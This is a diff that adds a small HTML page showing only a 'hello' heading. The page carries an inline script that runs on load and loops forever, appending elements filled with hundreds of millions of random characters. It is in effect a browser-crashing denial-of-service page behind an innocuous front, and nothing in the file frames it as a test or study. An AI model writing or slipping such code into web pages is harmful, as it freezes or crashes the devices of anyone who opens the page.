@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>idk</title>
+    </head>
+    <body>
+        <h1>hello</h1>
+    </body>
+    <script>
+        while (true) {
+            const element = document.createElement('h1')
+            for (let i = 0; i < 2 ** 28; i++) {
+                element.textContent += `${String.fromCharCode(Math.floor(Math.random() * 9999))}`
+            }
+            document.body.appendChild(element)
+        }
+    </script>
+</html>
